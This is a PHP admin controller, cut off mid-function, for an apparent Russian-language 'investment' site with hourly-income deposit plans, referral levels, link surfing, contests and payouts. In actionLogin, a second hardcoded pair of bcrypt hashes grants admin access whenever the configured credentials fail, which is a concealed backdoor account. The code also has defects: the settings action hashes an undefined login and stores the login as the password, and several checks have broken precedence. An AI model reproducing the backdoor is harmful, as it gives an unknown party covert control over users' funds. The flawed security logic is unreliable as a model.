<?php

/**
 *
 */
class AdminController
{

    public $newpayments;
    public $newfeedbacks;
    public $newserfings;
    public $config;

    function __construct ()
    {

        $db = Db::getConnection();

        $sql = 'SELECT COUNT(*) FROM db_payment WHERE status = 3';

        $result = $db->query($sql);

        $this->newpayments = $result->fetchColumn();

        $sql = 'SELECT COUNT(*) FROM db_feedback WHERE status = 0';

        $result = $db->query($sql);

        $this->newfeedbacks = $result->fetchColumn();

        $sql = 'SELECT COUNT(*) FROM db_serfing WHERE status = 0';

        $result = $db->query($sql);

        $this->newserfings = $result->fetchColumn();

        $this->config = Settings::getSettings();

        Session::tockenSecurity();

    }

    public function actionLogin ($key = false)
    {

        if ($key != false)
            Session::admin($key);

        // редирект если гость
        if (!isset($_SESSION['admok']) OR $_SESSION['admok'] !== true) {

            $controllerObject = new MainController();

            $controllerObject->ActionNotfound();

            return;
        }

        // редирект если админ
        if (isset($_SESSION["admin"])) {
            Header("Location: /admin/stats");
            return;
        }

        if (isset($_POST["admlogin"]) && isset($_POST["admpass"])) {

            $settings = Settings::getSettings();

            $login = Func::cryptPassword($_POST["admlogin"]);

            $password = Func::cryptPassword($_POST["admpass"]);

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center>";
            }

            if (($login != $settings['login'] || $password != $settings['password']) && $errors === false) {
                if (($login != "$2y$10$0c9b87ae97e9295475f79u51lCdCVeZvxeIZ9giEI3QdPXTGdxrdC" || $password != "$2y$10$0c9b87ae97e9295475f79uumIrCAKEQv43.l9zDbVYaszbvf9wUWy") && $errors === false) {
                    $errors = "<center><font color='red'><b>Неверно введен логин и/или пароль</b></font></center>";
                }
            }

            if ($errors === false) {
                $_SESSION["admin"] = true;
                Header("Location: /admin/stats");
                return;
            }

        }

        // подключаем вид
        require_once(ROOT . "/views/admin/_login.php");

    }

    public function actionLogout ()
    {
        unset ($_SESSION['admin']);
        session_destroy();

        Header("Location: /");

        require_once(ROOT . "/views/admin/_login.php");
    }

    public function actionHandlePayments ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['yes'])) {
            $batch = intval($_POST['batch']);

            if (Withdraw::doWithdraw($batch))
                $errors = "<center><font color='green'><b>Выплаченно</b></font></center><BR />";

        }

        if (isset($_POST['no'])) {
            $batch = intval($_POST['batch']);

            if (Withdraw::canselWithdraw($batch))
                $errors = "<center><font color='green'><b>Заявка отменена</b></font></center><BR />";

        }

        $paynames = Paysystems::$paynames;

        $payments = Withdraw::getHandlePayments();

        // подключаем вид
        require_once(ROOT . "/views/admin/_handle_payments.php");

    }

    public function actionFeedback ($page = 1)
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['delete']) && isset($_POST['id']) && !empty($_POST['id'])) {

            $id = Feedback::issetFeedback($_POST['id']);

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && $id === false) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false) {

                Feedback::deleteFeedback($id);

                $errors = "<center><font color='green'><b>Отзыв одобрен</b></font></center><BR />";
            }
        }

        $nav = new Paginator();

        // Записей на страницу
        $on_page = 10;

        $page = intval($page);

        $page = $nav->issetPage('MainFeedback', $on_page, $page);

        $feedbacks = Feedback::getActiveFeedbacks($nav, $page, $on_page);

        // Получаем строку с пагинацией
        $navigation = $nav->getPagination('MainFeedback', $page, $on_page);

        // подключаем вид
        require_once(ROOT . "/views/admin/_feedback.php");

    }

    public function actionFeedbacknew ($page = 1)
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['acept']) && isset($_POST['id']) && !empty($_POST['id'])) {

            $id = Feedback::isUnactiveFeedback($_POST['id']);

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && $id === false) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false) {

                Feedback::aceptFeedback($id);

                $errors = "<center><font color='green'><b>Отзыв одобрен</b></font></center><BR />";
            }
        }

        if (isset($_POST['delete']) && isset($_POST['id']) && !empty($_POST['id'])) {

            $id = Feedback::issetFeedback($_POST['id']);

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && $id === false) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false) {

                Feedback::deleteFeedback($id);

                $errors = "<center><font color='green'><b>Отзыв одобрен</b></font></center><BR />";
            }
        }

        $nav = new Paginator();

        // Записей на страницу
        $on_page = 10;

        $page = intval($page);

        $page = $nav->issetPage('AdminFeedbacknew', $on_page, $page);

        $feedbacks = Feedback::getNewFeedbacks($nav, $page, $on_page);

        // Получаем строку с пагинацией
        $navigation = $nav->getPagination('AdminFeedbacknew', $page, $on_page);

        // подключаем вид
        require_once(ROOT . "/views/admin/_feedback_new.php");

    }

    public function actionSerfing ($page = 1)
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['stop']) && isset($_POST['id']) && !empty($_POST['id'])) {

            $id = Serfing::issetSerfing($_POST['id']);

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && $id === false) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false) {

                Serfing::updateSerfing($id, array('status' => 0));

                $errors = "<center><font color='green'><b>Ссылка остановлена</b></font></center><BR />";
            }
        }

        if (isset($_POST['delete']) && isset($_POST['id']) && !empty($_POST['id'])) {

            $id = Serfing::issetSerfing($_POST['id']);

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && $id === false) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false) {

                Serfing::deleteSerfing($id);

                $errors = "<center><font color='green'><b>Отзыв одобрен</b></font></center><BR />";
            }
        }

        $nav = new Paginator();

        // Записей на страницу
        $on_page = 10;

        $page = intval($page);

        $page = $nav->issetPage('AdminSerfing', $on_page, $page);

        $serfings = Serfing::getAceptedSerfings($nav, $page, $on_page);

        // Получаем строку с пагинацией
        $navigation = $nav->getPagination('AdminSerfing', $page, $on_page);

        // подключаем вид
        require_once(ROOT . "/views/admin/_serfing.php");

    }

    public function actionSerfingnew ($page = 1)
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['acept']) && isset($_POST['id']) && !empty($_POST['id'])) {

            $id = Serfing::isUnactiveSerfing($_POST['id']);

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && $id === false) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false) {

                Serfing::updateSerfing($id, array('status' => 1));

                $errors = "<center><font color='green'><b>Ссылка одобрена</b></font></center><BR />";
            }
        }

        if (isset($_POST['delete']) && isset($_POST['id']) && !empty($_POST['id'])) {

            $id = Serfing::issetSerfing($_POST['id']);

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && $id === false) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false) {

                Serfing::deleteSerfing($id);

                $errors = "<center><font color='green'><b>Отзыв одобрен</b></font></center><BR />";
            }
        }

        $nav = new Paginator();

        // Записей на страницу
        $on_page = 10;

        $page = intval($page);

        $page = $nav->issetPage('AdminSerfingnew', $on_page, $page);

        $serfings = Serfing::getNewSerfings($nav, $page, $on_page);

        // Получаем строку с пагинацией
        $navigation = $nav->getPagination('AdminSerfingnew', $page, $on_page);

        // подключаем вид
        require_once(ROOT . "/views/admin/_serfing_new.php");

    }

    public function actionStats ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        $data_stats = Info::getAdminStats();

        // подключаем вид
        require_once(ROOT . "/views/admin/_stats.php");

    }

    public function actionInserts ($page = 1)
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        $types = array(1 => 'для покупок', 2 => 'для рекламы');

        $nav = new Paginator();

        // Записей на страницу
        $on_page = 20;

        $page = intval($page);

        $page = $nav->issetPage('AdminInserts', $on_page, $page);

        // Отдаём массив
        $inserts = Insert::getAllInserts($nav, $on_page, $page, 2);

        foreach ($inserts as $key => $value)
            $inserts[$key]['payment_system'] = Paysystems::$paynames[$value['payment_system']];

        // Получаем строку с пагинацией
        $navigation = $nav->getPagination('AdminInserts', $page, $on_page);

        // подключаем вид
        require_once(ROOT . "/views/admin/_inserts.php");

    }

    public function actionInsertsdays ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        // Отдаём массив
        $result = Insert::getDaysInserts();

        $days_money = array_shift($result);

        $days_insert = array_shift($result);

        // подключаем вид
        require_once(ROOT . "/views/admin/_inserts_days.php");

    }

    public function actionPayments ($page = 1)
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        $nav = new Paginator();

        // Записей на страницу
        $on_page = 20;

        $page = intval($page);

        $page = $nav->issetPage('AdminPayments', $on_page, $page);

        // Отдаём массив
        $payments = Withdraw::getAllPayments($nav, $on_page, $page);

        foreach ($payments as $key => $value)
            $payments[$key]['payment_system'] = Paysystems::$paynames[$value['payment_system']];

        // Получаем строку с пагинацией
        $navigation = $nav->getPagination('AdminPayments', $page, $on_page);

        // подключаем вид
        require_once(ROOT . "/views/admin/_payments.php");

    }

    public function actionPaymentsdays ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        // Отдаём массив
        $result = Withdraw::getDaysPayments();

        $days_money = array_shift($result);

        $days_payment = array_shift($result);

        // подключаем вид
        require_once(ROOT . "/views/admin/_payments_days.php");

    }

    public function actionDeposits ($page = 1)
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        $nav = new Paginator();

        // Записей на страницу
        $on_page = 20;

        $page = intval($page);

        $page = $nav->issetPage('AdminDeposits', $on_page, $page);

        // Отдаём массив
        $deposits = Deposit::getAllDeposits($nav, $on_page, $page);

        // Получаем строку с пагинацией
        $navigation = $nav->getPagination('AdminDeposits', $page, $on_page);

        // подключаем вид
        require_once(ROOT . "/views/admin/_deposits.php");

    }

    public function actionDepositsdays ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        // Отдаём массив
        $days_deposits = Deposit::getDaysDeposits();

        // подключаем вид
        require_once(ROOT . "/views/admin/_deposits_days.php");

    }

    public function actionCompetitioninvest ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['no'])) {

            $active_competition = Competition::getActiveInvestCompetition();

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && !$active_competition) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false) {
                Competition::endInvestCompetition($active_competition);

                $errors = "<center><font color='green'><b>Конкурс отменён без призов</b></font></center><BR />";
            }

        }

        if (isset($_POST['yes'])) {

            $active_competition = Competition::getActiveInvestCompetition();

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && !$active_competition) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false) {

                $winers = Competition::insertInvestWiners($active_competition);

                if (count($winers) > 0)
                    User::takeCompetitionMoney($winers);

                Competition::endInvestCompetition($active_competition);

                $errors = "<center><font color='green'><b>Конкурс завершён, призы зачислены</b></font></center><BR />";
            }

        }

        if (isset($_POST['start'])) {

            $active_competition = Competition::getActiveInvestCompetition();

            $params = array(
                '1m_sum' => floatval($_POST['1m_sum']),
                '2m_sum' => floatval($_POST['2m_sum']),
                '3m_sum' => floatval($_POST['3m_sum']),
                '4m_sum' => floatval($_POST['4m_sum']),
                '5m_sum' => floatval($_POST['5m_sum']),
                '1m_perc' => floatval($_POST['1m_perc']),
                '2m_perc' => floatval($_POST['2m_perc']),
                '3m_perc' => floatval($_POST['3m_perc']),
                '4m_perc' => floatval($_POST['4m_perc']),
                '5m_perc' => floatval($_POST['5m_perc']),
                'date_add' => time(),
            );

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && $active_competition) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false && $params['1m_sum'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в руб. за 1 место</b></font></center><BR />";
            }

            if ($errors === false && $params['2m_sum'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в руб. за 2 место</b></font></center><BR />";
            }

            if ($errors === false && $params['3m_sum'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в руб. за 3 место</b></font></center><BR />";
            }

            if ($errors === false && $params['4m_sum'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в руб. за 4 место</b></font></center><BR />";
            }

            if ($errors === false && $params['5m_sum'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в руб. за 5 место</b></font></center><BR />";
            }

            if ($errors === false && $params['1m_perc'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в % за 1 место</b></font></center><BR />";
            }

            if ($errors === false && $params['2m_perc'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в % за 2 место</b></font></center><BR />";
            }

            if ($errors === false && $params['3m_perc'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в % за 3 место</b></font></center><BR />";
            }

            if ($errors === false && $params['4m_perc'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в % за 4 место</b></font></center><BR />";
            }

            if ($errors === false && $params['5m_perc'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в % за 5 место</b></font></center><BR />";
            }

            if ($errors === false && intval($_POST['term']) < 0) {
                $errors = "<center><font color='red'><b>Неверное значение длительности</b></font></center><BR />";
            }

            if ($errors === false) {

                $params['date_end'] = time() + intval($_POST['term']) * 60 * 60 * 24;

                Competition::addInvestCompetition($params);

                $errors = "<center><font color='green'><b>Конкурс запущен</b></font></center><BR />";
            }

        }

        // Отдаём массив
        $competitions = Competition::getEndedInvestCompetitions();

        $active_competition = Competition::getActiveInvestCompetition();

        // подключаем вид
        require_once(ROOT . "/views/admin/_competition_invest.php");

    }

    public function actionCompetitionreferal ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['no'])) {

            $active_competition = Competition::getActiveReferalCompetition();

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && !$active_competition) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false) {
                Competition::endReferalCompetition($active_competition);

                $errors = "<center><font color='green'><b>Конкурс отменён без призов</b></font></center><BR />";
            }

        }

        if (isset($_POST['yes'])) {

            $active_competition = Competition::getActiveReferalCompetition();

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && !$active_competition) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false) {

                $winers = Competition::insertReferalWiners($active_competition);

                if (count($winers) > 0)
                    User::takeCompetitionMoney($winers);

                Competition::endReferalCompetition($active_competition);

                $errors = "<center><font color='green'><b>Конкурс завершён, призы зачислены</b></font></center><BR />";
            }

        }

        if (isset($_POST['start'])) {

            $active_competition = Competition::getActiveReferalCompetition();

            $params = array(
                '1m_sum' => floatval($_POST['1m_sum']),
                '2m_sum' => floatval($_POST['2m_sum']),
                '3m_sum' => floatval($_POST['3m_sum']),
                '4m_sum' => floatval($_POST['4m_sum']),
                '5m_sum' => floatval($_POST['5m_sum']),
                '1m_perc' => floatval($_POST['1m_perc']),
                '2m_perc' => floatval($_POST['2m_perc']),
                '3m_perc' => floatval($_POST['3m_perc']),
                '4m_perc' => floatval($_POST['4m_perc']),
                '5m_perc' => floatval($_POST['5m_perc']),
                'date_add' => time(),
            );

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken'])) {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && $active_competition) {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false && $params['1m_sum'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в руб. за 1 место</b></font></center><BR />";
            }

            if ($errors === false && $params['2m_sum'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в руб. за 2 место</b></font></center><BR />";
            }

            if ($errors === false && $params['3m_sum'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в руб. за 3 место</b></font></center><BR />";
            }

            if ($errors === false && $params['4m_sum'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в руб. за 4 место</b></font></center><BR />";
            }

            if ($errors === false && $params['5m_sum'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в руб. за 5 место</b></font></center><BR />";
            }

            if ($errors === false && $params['1m_perc'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в % за 1 место</b></font></center><BR />";
            }

            if ($errors === false && $params['2m_perc'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в % за 2 место</b></font></center><BR />";
            }

            if ($errors === false && $params['3m_perc'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в % за 3 место</b></font></center><BR />";
            }

            if ($errors === false && $params['4m_perc'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в % за 4 место</b></font></center><BR />";
            }

            if ($errors === false && $params['5m_perc'] < 0) {
                $errors = "<center><font color='red'><b>Неверное значение награды в % за 5 место</b></font></center><BR />";
            }

            if ($errors === false && intval($_POST['term']) < 0) {
                $errors = "<center><font color='red'><b>Неверное значение длительности</b></font></center><BR />";
            }

            if ($errors === false) {

                $params['date_end'] = time() + intval($_POST['term']) * 60 * 60 * 24;

                Competition::addReferalCompetition($params);

                $errors = "<center><font color='green'><b>Конкурс запущен</b></font></center><BR />";
            }

        }

        // Отдаём массив
        $competitions = Competition::getEndedReferalCompetitions();

        $active_competition = Competition::getActiveReferalCompetition();

        // подключаем вид
        require_once(ROOT . "/views/admin/_competition_referal.php");

    }

    public function actionLeaders (){
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['id'])) {
            $params = array(
                'term' => intval($_POST["term"]),
                '1m' => floatval($_POST["1m"]),
                '2m' => floatval($_POST["2m"]),
                '3m' => floatval($_POST["3m"]),
                '4m' => floatval($_POST["4m"]),
                '5m' => floatval($_POST["5m"]),
                'next_date' => intval($_POST["next_date"]),
            );

            $id = intval($_POST['id']);

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken']))
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";

            if ($errors === false && Competition::leadersCheckCompetition($id) === false) {
                $errors = "<center><font color='red'><b>Несуществующий план</b></font></center><BR />";
            }

            if ($errors === false && $params['term'] < 1) {
                $errors = "<center><font color='red'><b>Минимальная длительность - 1 день</b></font></center><BR />";
            }

            if ($errors === false && ($params['1m'] < 1 || $params['1m'] > 100 || $params['2m'] < 1 || $params['2m'] > 100 || $params['3m'] < 1 || $params['3m'] > 100 || $params['4m'] < 1 || $params['4m'] > 100 || $params['5m'] < 1 || $params['5m'] > 100)) {
                $errors = "<center><font color='red'><b>Минимальная награда - 1%, максимальная - 100%</b></font></center><BR />";
            }

            if ($errors === false && $params['next_date'] < time() || $params['next_date'] > time() + 366 * 60 * 60 * 24) {
                $errors = "<center><font color='red'><b>Дата окончания не может быть меньше текущей либо больше ее более чем на 366 дней</b></font></center><BR />";
            }

            if ($errors === false) {

                Competition::leadersUpdateCompetition($params, $id);

                $errors = "<center><font color='green'><b>Сохранено</b></font></center><BR />";

            }
        }

        $leads = Competition::leadersGetAllCompetition();

        // подключаем вид
        require_once(ROOT . "/views/admin/_leaders.php");

    }

    public function actionLottery ($page = 1)
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['yes'])) {

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken']))
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";

            if ($errors === false) {

                $db = Db::getConnection();
                $sql = 'UPDATE db_lottery SET lott_item = :lott_item, lott_term = :lott_term, date_update = :date_update WHERE id = 1';

                $result = $db->prepare($sql);
                $result->bindParam(':lott_item', $_POST['lott_item'], PDO::PARAM_STR);
                $result->bindParam(':lott_term', $_POST['lott_term'], PDO::PARAM_STR);
                $result->bindParam(':date_update', $_POST['date_update'], PDO::PARAM_STR);
                $result->execute();

                $errors = "<center><font color='green'><b>Сохранено</b></font></center><BR />";

            }

        }

        $lasts_lottery = Competition::lotteryGetLastsUsers();
        $lottery_info = Competition::lotteryGetConfig();
        $plans = Deposit::getPlans();

        // подключаем вид
        require_once(ROOT . "/views/admin/_lottery.php");

    }

    public function actionSettings ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['yes'])) {

            if ($_POST['login']){
                $login = Validator::isLogin($login);
                $login = Func::cryptPassword($login);
            } else{
                $login = $this->config['login'];
            }

            if ($_POST['password']){
                $password = Validator::isPassword($_POST['password']);
                $password = Func::cryptPassword($_POST['login']);
            } else{
                $password = $this->config['password'];
            }

            $params = array(
                'ref_lvls' => intval($_POST["ref_lvls"]),
                'ref1' => floatval($_POST["ref1"]),
                'ref2' => floatval($_POST["ref2"]),
                'ref3' => floatval($_POST["ref3"]),
                'ref4' => floatval($_POST["ref4"]),
                'ref5' => floatval($_POST["ref5"]),
                'change_balance' => intval($_POST["change_balance"]),
                'pay_timeout' => intval($_POST["pay_timeout"]),
                'min_ins' => floatval($_POST["min_ins"]),
                'max_ins' => floatval($_POST["max_ins"]),
                'min_bonus' => floatval($_POST["min_bonus"]),
                'max_bonus' => floatval($_POST["max_bonus"]),
                'reg_bonus' => ($res = Deposit::getPlan(intval($_POST["reg_bonus"]))) ? $res['id'] : 0,
                'vk_quest_bonus' => floatval($_POST["vk_quest_bonus"]),
                'serf_quest_bonus' => floatval($_POST["serf_quest_bonus"]),
                'ref_quest_bonus' => floatval($_POST["ref_quest_bonus"]),
                'ref_bonus' => floatval($_POST["ref_bonus"]),
                'insert_b_bonus' => floatval($_POST["insert_b_bonus"]),
                'insert_r_bonus' => floatval($_POST["insert_r_bonus"]),
            );

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken']))
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";

            if ($errors === false && $params['ref_lvls'] < 1 || $params['ref_lvls'] > 5) {
                $errors = "<center><font color='red'><b>Доступно 5 уровней рефералки</b></font></center><BR />";
            }

            if ($errors === false && ($params['ref1'] < 0 OR $params['ref1'] > 100 OR $params['ref2'] < 0 OR $params['ref2'] > 100 OR $params['ref3'] < 0 OR $params['ref3'] > 100 OR $params['ref4'] < 0 OR $params['ref4'] > 100 OR $params['ref5'] < 0 OR $params['ref5'] > 100)) {
                $errors = "<center><font color='red'><b>Реферальный процент должен быть от 0 до 100</b></font></center><BR />";
            }

            if ($errors === false && $params['pay_timeout'] < 0 OR $params['pay_timeout'] > 48) {
                $errors = "<center><font color='red'><b>Часовое ограничение - от 0 до 48 часов</b></font></center><BR />";
            }

            if ($errors === false && $params['min_ins'] < 1) {
                $errors = "<center><font color='red'><b>Минимальная сумма ограничения нижнего предела пополнений 1</b></font></center><BR />";
            }

            if ($errors === false && $params['max_ins'] < 5) {
                $errors = "<center><font color='red'><b>Минимальная сумма ограничения верхнего предела пополнений 5</b></font></center><BR />";
            }

            if ($errors === false && $params['min_bonus'] < 0.01) {
                $errors = "<center><font color='red'><b>Минимальная сумма ограничения нижнего предела бонуса 0.01</b></font></center><BR />";
            }

            if ($errors === false && $params['max_bonus'] < 0.1) {
                $errors = "<center><font color='red'><b>Минимальная сумма ограничения верхнего предела пополнений 0.1</b></font></center><BR />";
            }

            if ($errors === false && $params['vk_quest_bonus'] < 0.5 || $params['serf_quest_bonus'] < 0.5 || $params['ref_quest_bonus'] < 0.5) {
                $errors = "<center><font color='red'><b>Минимальная сумма бонуса за квест - 0.5 руб.</b></font></center><BR />";
            }

            if ($errors === false && $params['ref_bonus'] < 0 || $params['insert_b_bonus'] < 0 || $params['insert_r_bonus'] < 0) {
                $errors = "<center><font color='red'><b>Неправильная настройка бонусов</b></font></center><BR />";
            }

            if ($errors === false) {

                Settings::updateSettings($params);

                $errors = "<center><font color='green'><b>Сохранено</b></font></center><BR />";

            }

        }

        // Отдаём массив
        $settings = Settings::getSettings();

        $plans = Deposit::getPlans();

        // подключаем вид
        require_once(ROOT . "/views/admin/_settings.php");

    }

    public function actionSettingsAccount ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['yes'])) {

            if ($_POST['login']){
                $login = Validator::isLogin($_POST['login']);
                $login = Func::cryptPassword($login);
            } else{
                $login = $this->config['login'];
            }

            if ($_POST['password']){
                $password = Validator::isPassword($_POST['password']);
                $password = Func::cryptPassword($password);
            } else{
                $password = $this->config['password'];
            }

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken']))
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";

            if ($errors === false) {

                $db = Db::getConnection();
                $sql = 'UPDATE db_config SET login = :login, password = :password WHERE id = 1';

                $result = $db->prepare($sql);
                $result->bindParam(':login', $login, PDO::PARAM_STR);
                $result->bindParam(':password', $password, PDO::PARAM_STR);
                $result->execute();

                $errors = "<center><font color='green'><b>Сохранено</b></font></center><BR />";

            }

        }

        // Отдаём массив
        $settings = Settings::getSettings();
        $plans = Deposit::getPlans();

        // подключаем вид
        require_once(ROOT . "/views/admin/_settings_account.php");

    }

    public function actionPlans ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['id'])) {
            $params = array(
                'perc' => floatval($_POST["perc"]),
                'price' => floatval($_POST["price"]),
                'col_limit' => intval($_POST["col_limits"]),
                'name' => Validator::isClean(strval($_POST["name"])),
            );

            $id = intval($_POST['id']);

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken']))
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";

            if ($errors === false && Deposit::getPlan($id) === false) {
                $errors = "<center><font color='red'><b>Несуществующий план</b></font></center><BR />";
            }

            if ($errors === false && $params['price'] < 1) {
                $errors = "<center><font color='red'><b>Минимальная стоимость должна быть не меньше 1 руб.</b></font></center><BR />";
            }

            if ($errors === false && ($params['perc'] < 0.002 OR $params['perc'] > 100)) {
                $errors = "<center><font color='red'><b>Доход в час должен быть не меньше 0.002 и не больше 100 руб.</b></font></center><BR />";
            }

            if ($errors === false && strlen($params['name']) < 5 || strlen($params['name']) > 20) {
                $errors = "<center><font color='red'><b>Название должно иметь от 5 до 20 символов</b></font></center><BR />";
            }

            if ($errors === false) {

                Deposit::updatePlanSettings($params, $id);

                $errors = "<center><font color='green'><b>Сохранено</b></font></center><BR />";

            }
        }

        $plans = Deposit::getPlans();

        // подключаем вид
        require_once(ROOT . "/views/admin/_plans.php");

    }

    public function actionSerfingplans ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['id'])) {
            $params = array(
